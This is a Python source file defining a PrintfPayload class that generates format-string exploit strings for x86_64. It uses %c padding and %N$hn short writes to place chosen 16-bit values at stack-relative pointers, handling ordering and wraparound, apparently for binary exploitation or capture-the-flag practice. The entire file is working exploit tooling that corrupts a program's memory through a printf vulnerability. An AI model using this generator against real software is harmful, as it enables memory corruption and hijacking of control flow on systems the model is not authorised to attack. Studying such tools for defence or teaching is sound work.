from collections import namedtuple
# Only x86_64 supported

# Generate printf write payload using short integer mode
# using pointers that already exist on the stack
class PrintfPayload:
    '''
    param: One printf format specifier.
    offset: Memory address of the value to write to
            relative to rsp.
    '''
    WritePair = namedtuple('WritePair', ['offset', 'val'])
    def __init__(self):
        self.writes: list[PrintfPayload.WritePair] = []
        self._written = 0
        self._written_params = 0
    # Note: offset is the number of bytes relative to
    # stack pointer
    def write(self, offset: int, val: int):
        assert(offset % 8 == 0)
        assert(0 <= val <= 0xFFFF)
        self.writes.append(PrintfPayload.WritePair(offset, val))
    @staticmethod
    def _get_steps(written: int, target_val: int):
        if target_val < written&0xFFFF:
            target_val += 0x10000
        return target_val - written & 0xFFFF
    def _write_pad(self, params: int, target_val: int):
        '''Appends a set of paddings (%c)s to the payload'''
        self.payload += '%c'*(params-1)
        self._written += params-1
        self._written_params += params-1
        steps = PrintfPayload._get_steps(self._written, target_val)
        if steps > 0:
            self.payload += f'%{steps}c'
            self._written += steps
            self._written_params += 1
    # Payload generation using short integer mode
    def flat(self, use_num_params: bool = True, reset_write_count: bool = False):
        '''Generates a printf payload string.'''
        if use_num_params:
            self.writes = sorted(self.writes, key=lambda x: x.val) # sort by write value
        else:
            self.writes = sorted(self.writes)
        self.payload = ''
        for write in self.writes:
            if use_num_params:
                self._write_pad(1, write.val)
                self.payload += f'%{write.offset // 8 + 6}$hn'
                self._written_params += 1
            else:
                # The offset must also be in order
                # Value can be not in order by overflowing
                param_no = write.offset // 8 + 6
                self._write_pad(param_no-1-self._written_params, write.val)
                self.payload += '%hn'
                self._written_params += 1
        if reset_write_count:
            self._write_pad(1, 0)
        return self.payload.encode()
